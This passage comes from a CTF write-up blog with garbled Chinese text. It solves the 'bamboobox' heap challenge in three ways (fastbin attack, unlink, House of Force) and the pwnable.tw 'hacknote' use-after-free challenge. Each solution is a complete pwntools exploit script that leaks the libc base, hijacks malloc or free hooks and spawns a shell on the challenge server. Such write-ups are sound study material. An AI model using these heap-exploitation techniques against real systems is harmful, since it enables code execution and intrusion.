class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3, overlappnig with idx 2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba5&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + <span class="number">0x4526a</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/06/ezYrE2R1X9JdQxk.png" alt="image.png"></p>
<blockquote>
<p>æœ¬åœ°çš„æ ˆè°ƒäº†æˆ‘åŠå¤©ï¼Œè¿œç¨‹æ ˆä¸ä¸€æ ·åˆè°ƒäº†åŠå¤©â€¦</p>
</blockquote>
<h3 id="è§£æ³•äºŒï¼šUnlink"><a href="#è§£æ³•äºŒï¼šUnlink" class="headerlink" title="è§£æ³•äºŒï¼šUnlink"></a>è§£æ³•äºŒï¼šUnlink</h3><p>æ²¡å¼€åœ°å€éšæœºåŒ–ï¼Œé‚£å°±æ¯”è¾ƒå¸¸è§„åœ°ç”¨ unlink åŠ«æŒæŒ‡é’ˆæ•°ç»„å³å¯</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25366</span>)<span class="comment">#process(&#x27;./bamboobox&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line">heap_array = <span class="number">0x6020c0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x40</span>, p64(<span class="number">0x21</span>) * <span class="number">6</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 5</span></span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 6</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 7</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 8</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 3, overlappnig with idx 2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba5&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    dump()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">6</span>,<span class="number">0x30</span> , p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heap_array + <span class="number">0x68</span> - <span class="number">0x18</span>) + p64(heap_array + <span class="number">0x68</span> - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>))</span><br><span class="line">    </span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">6</span>, <span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + <span class="string">b&#x27;arttnba3&#x27;</span> + p64(heap_array + <span class="number">0x50</span>))</span><br><span class="line">    edit(<span class="number">5</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">6</span>, <span class="number">8</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/08/t1I9OGLFlXPapzo.png" alt="image.png"></p>
<h3 id="è§£æ³•ä¸‰ï¼šHouse-of-Force"><a href="#è§£æ³•ä¸‰ï¼šHouse-of-Force" class="headerlink" title="è§£æ³•ä¸‰ï¼šHouse of Force"></a>è§£æ³•ä¸‰ï¼šHouse of Force</h3><p>æœ‰å †æº¢å‡ºï¼Œåˆ›å»ºå †å—æ—¶ä¸é™åˆ¶å¤§å°ï¼Œé‚£å°±æ”¹ top chunk size ä»¥åé€šè¿‡æ•´å‹æº¢å‡ºä½¿å¾— top chunk åˆ†é…åˆ°å‰é¢çš„chunkï¼Œå½¢æˆoverlappingï¼ˆ<del>ä½†æ˜¯éƒ½æœ‰å †æº¢å‡ºäº†è¿˜éœ€è¦è¿™æ ·çš„æ–¹å¼æ„é€  chunk overlappingğŸ¦„</del>ï¼‰</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25366</span>)<span class="comment">#process(&#x27;./bamboobox&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)#</span></span><br><span class="line">heap_array = <span class="number">0x6020c0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x40</span>, p64(<span class="number">0x21</span>) * <span class="number">6</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 5</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 6</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 7</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 3, overlappnig with idx 2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba5&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    dump()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3, overlapping with idx 2</span></span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    dump()</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;2 : &#x27;</span>)</span><br><span class="line">    heap_leak = u64(p.recvuntil(<span class="string">b&#x27;4 : &#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;heap addr leak: &#x27;</span> + <span class="built_in">hex</span>(heap_leak))</span><br><span class="line">    top_addr = heap_leak + <span class="number">0x40</span></span><br><span class="line">    log.info(<span class="string">&#x27;top chunk addr: &#x27;</span> + <span class="built_in">hex</span>(top_addr))</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">7</span>, <span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xfffffffffffffff1</span>))</span><br><span class="line">    </span><br><span class="line">    new((-<span class="number">0x200</span>), <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x140</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 6</span></span><br><span class="line">    new(<span class="number">0x30</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 8</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x8</span>, p64(<span class="number">0x6020c0</span> + <span class="number">0x38</span>))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    new(<span class="number">0x30</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># idx 8 back</span></span><br><span class="line">    new(<span class="number">0x30</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])) <span class="comment"># idx 9, the heap array</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/08/yaP3HvoLJiZgxuq.png" alt="image.png"></p>
<h2 id="0x047-pwnable-hacknote-Use-After-Free-heap-arrangement"><a href="#0x047-pwnable-hacknote-Use-After-Free-heap-arrangement" class="headerlink" title="0x047.pwnable_hacknote - Use After Free + heap arrangement"></a>0x047.pwnable_hacknote - Use After Free + heap arrangement</h2><blockquote>
<p>pwnable.twä¸Šçš„åŸé¢˜</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2021/02/27/pVnPETsdzxrbX8o.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>å¤§æ¦‚æ˜¯ä¸€é“æœ‰ç€åˆ†é…ã€é‡Šæ”¾ã€æ‰“å°å †å—åŠŸèƒ½çš„å †é¢˜</p>
<p><img src="https://i.loli.net/2021/02/27/boTLc5AS1pjPGlZ.png" alt="image.png"></p>
<p>å…¶ä¸­åˆ†é…å †å—çš„å‡½æ•°å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2021/02/27/sreVaIyX8uMCLlh.png" alt="image.png"></p>
<p>ä¸éš¾çœ‹å‡ºæ¯ä¸ªnoteçš„ç»“æ„åº”å½“å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_NOTE_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">void</span> (*ptr)(<span class="type">char</span>*);</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;note;</span><br></pre></td></tr></table></figure>

<p>æ¼æ´ç‚¹åœ¨äºé‡Šæ”¾å‡½æ•°ä¸­ï¼Œé‡Šæ”¾åæœªå°†æŒ‡é’ˆç½®0ï¼Œå­˜åœ¨UAFæ¼æ´</p>
<p><img src="https://i.loli.net/2021/02/27/NPbM7Ii5dxVGJoj.png" alt="image.png"></p>
<p>åŸºæœ¬ä¸Šå°±æ˜¯å¥—æ¿å­åšé¢˜ï¼Œå †é£æ°´ä¸€å¥—å¸¦èµ°</p>
<p>åœ¨è¿™é‡Œæœ‰ä¸ªè¸©å‘çš„ç‚¹å°±æ˜¯å…¶å‡½æ•°æŒ‡é’ˆçš„è°ƒç”¨æ–¹å¼ï¼Œå…¶è¯»å–çš„èµ·å§‹èŒƒå›´ä¼šåŒ…æ‹¬å‰é¢çš„éƒ¨åˆ†ï¼Œæ•…æˆ‘ä»¬éœ€è¦ç”¨<code>;sh\x00</code>è¿›è¡Œå¡«å……</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10102</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Note size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x8</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x50</span>, <span class="string">b&#x27;artt&#x27;</span>) <span class="comment"># idx 2, overlapping with idx 0</span></span><br><span class="line">    dump(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;artt&#x27;</span>)</span><br><span class="line">    main_arena = u32(p.recv(<span class="number">4</span>)) - <span class="number">48</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x18</span></span><br><span class="line">    libc_base = __malloc_hook  - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x8</span>, p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;;sh\x00&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    dump(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/27/6AafhE97z5XJlSo.png" alt="F_QAG__EVIR0_X8VZF30R_L.png"></p>
